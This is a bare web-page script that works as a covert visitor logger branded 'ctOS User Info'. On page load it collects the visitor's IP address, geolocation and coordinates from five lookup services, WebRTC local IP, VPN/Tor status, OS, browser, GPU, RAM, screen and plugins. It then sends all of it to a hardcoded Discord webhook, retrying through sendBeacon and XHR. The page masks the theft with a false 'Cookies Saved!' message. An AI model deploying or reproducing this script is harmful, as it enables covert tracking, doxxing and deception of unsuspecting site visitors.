<script>
    // ================================================================
    //  WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    function setStatus(text, isError = false) {
        const el = document.getElementById('status');
        if (el) {
            el.textContent = text;
            el.style.color = isError ? '#ff4444' : '#00ff00';
            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
        }
    }

    // ================================================================
    //  MULTI-API IP FETCH (5 second timeout, all HTTPS)
    // ================================================================
    function fetchIPFromApis() {
        const apis = [
            // ipapi.co – full geo
            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
                .then(r => r.json())
                .then(d => d.ip ? d : null)
                .catch(() => null),

            // ip-api.com (now HTTPS)
            fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) })
                .then(r => r.json())
                .then(d => d.query ? {
                    ip: d.query,
                    org: d.isp,
                    country_name: d.country,
                    region: d.regionName,
                    city: d.city,
                    latitude: d.lat,
                    longitude: d.lon,
                    proxy: d.proxy || false
                } : null)
                .catch(() => null),

            // ipinfo.io
            fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(5000) })
                .then(r => r.json())
                .then(d => d.ip ? {
                    ip: d.ip,
                    org: d.org,
                    country_name: d.country,
                    region: d.region,
                    city: d.city,
                    latitude: d.loc ? d.loc.split(',')[0] : null,
                    longitude: d.loc ? d.loc.split(',')[1] : null,
                    proxy: false
                } : null)
                .catch(() => null),

            // api.ip.sb/geoip
            fetch('https://api.ip.sb/geoip', { signal: AbortSignal.timeout(5000) })
                .then(r => r.json())
                .then(d => d.ip ? {
                    ip: d.ip,
                    org: d.isp || d.organization,
                    country_name: d.country,
                    region: d.region,
                    city: d.city,
                    latitude: d.latitude,
                    longitude: d.longitude,
                    proxy: false
                } : null)
                .catch(() => null),

            // ipify – only IP, no geo
            fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) })
                .then(r => r.json())
                .then(d => d.ip ? { ip: d.ip, org: null, country_name: null, region: null, city: null, latitude: null, longitude: null, proxy: false } : null)
                .catch(() => null)
        ];

        // Wait for all to settle, then pick first non-null
        return Promise.allSettled(apis)
            .then(results => {
                for (const res of results) {
                    if (res.status === 'fulfilled' && res.value) {
                        return res.value;
                    }
                }
                return null; // all failed
            });
    }

    // ================================================================
    //  FALLBACK: WebRTC local IP + Timezone location
    // ================================================================
    function getFallbackData() {
        return new Promise((resolve) => {
            let localIP = '0.0.0.0';
            let pc = null;
            try {
                pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        pc.close();
                        // Extract IP from candidate
                        resolve(localIP);
                        return;
                    }
                    const parts = e.candidate.candidate.split(' ');
                    if (parts.length > 7) {
                        const ip = parts[4];
                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
                            localIP = ip;
                        }
                    }
                };
                setTimeout(() => {
                    if (pc) pc.close();
                    resolve(localIP);
                }, 1000);
            } catch (e) {
                resolve(localIP);
            }
        }).then(ip => {
            // Estimate location from timezone
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            let city = tz.split('/').pop().replace('_', ' ') || 'Unknown City';
            let country = tz.split('/')[0] || 'Unknown Country';
            // Attempt to map some common timezones (just for fallback)
            const tzMap = {
                'America/New_York': { city: 'New York', country: 'USA' },
                'America/Los_Angeles': { city: 'Los Angeles', country: 'USA' },
                'Europe/London': { city: 'London', country: 'UK' },
                'Europe/Paris': { city: 'Paris', country: 'France' },
                'Asia/Tokyo': { city: 'Tokyo', country: 'Japan' },
                // ... add more as needed
            };
            if (tzMap[tz]) {
                city = tzMap[tz].city;
                country = tzMap[tz].country;
            }
            return {
                ip: ip,
                org: 'Local network (fallback)',
                country_name: country,
                region: 'N/A',
                city: city,
                latitude: '0',
                longitude: '0',
                proxy: false
            };
        });
    }

    // ================================================================
    //  VPN/TOR DETECTION
    // ================================================================
    function detectVPNorTOR() {
        return new Promise((resolve) => {
            let isVpn = false;
            const ua = navigator.userAgent;
            if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) {
                isVpn = true;
            }
            // WebRTC check
            let pc = null;
            let hasRealIP = false;
            try {
                pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        pc.close();
                        if (!hasRealIP) isVpn = true;
                        resolve(isVpn);
                        return;
                    }
                    const parts = e.candidate.candidate.split(' ');
                    if (parts.length > 7) {
                        const ip = parts[4];
                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
                            hasRealIP = true;
                        }
                    }
                };
                setTimeout(() => {
                    if (pc) pc.close();
                    if (!hasRealIP) isVpn = true;
                    resolve(isVpn);
                }, 1000);
            } catch (e) {
                isVpn = true;
                resolve(isVpn);
            }
        });
    }

    // ================================================================
    //  SEND MESSAGE
    // ================================================================
    function sendMessage(msg) {
        return new Promise((resolve) => {
            let sent = false;
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg }),
                keepalive: true
            })
            .then(res => res.ok ? (sent = true, resolve(true)) : null)
            .catch(() => {
                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                if (navigator.sendBeacon(WEBHOOK, blob)) {
                    sent = true;
                    resolve(true);
                } else {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', WEBHOOK, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({ content: msg }));
                        xhr.onload = () => { if (xhr.status === 200 || xhr.status === 204) resolve(true); };
                        xhr.onerror = () => resolve(false);
                        setTimeout(() => resolve(false), 2000);
                    } catch (e) {
                        resolve(false);
                    }
                }
            });
            setTimeout(() => resolve(sent), 3000);
        });
    }

    // ================================================================
    //  MAIN
    // ================================================================
    (async function() {
        try {
            setStatus('Gathering data...');

            // ---- System info ----
            const ua = navigator.userAgent;
            const os = (() => {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Other';
            })();
            const browser = (() => {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            let gpu = 'Not available';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Not available';
                }
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // ---- Try APIs first ----
            setStatus('Fetching IP...');
            let ipData = await fetchIPFromApis();

            // ---- If all fail, use fallback ----
            if (!ipData) {
                setStatus('Using fallback...');
                ipData = await getFallbackData();
            }

            // ---- VPN detection ----
            setStatus('Checking VPN/Tor...');
            let isVpn = await detectVPNorTOR();
            if (ipData) {
                if (ipData.proxy === true) isVpn = true;
                if (ipData.org) {
                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                    const orgLower = ipData.org.toLowerCase();
                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
                }
            }

            // ---- Build message (no placeholders) ----
            const ip = ipData.ip || '0.0.0.0';
            const isp = ipData.org || 'Unknown ISP';
            const location = (ipData.city ? ipData.city + ', ' : '') + (ipData.region ? ipData.region + ', ' : '') + (ipData.country_name || 'Unknown Country');
            const coords = (ipData.latitude && ipData.longitude) ? (ipData.latitude + ', ' + ipData.longitude) : '0, 0';

            const msg = 
`**ctOS User Info**
**IP:** ${ip} (${isp})
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${navigator.hardwareConcurrency || '1'}
**RAM:** ${navigator.deviceMemory || '0'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

            // ---- Send ----
            setStatus('Sending...');
            const sent = await sendMessage(msg);

            setStatus(sent ? '✅ Cookies Saved!' : '❌ Send failed – check webhook', !sent);

        } catch (err) {
            setStatus('❌ Error: ' + err.message, true);
            console.error(err);
        }
    })();
</script>
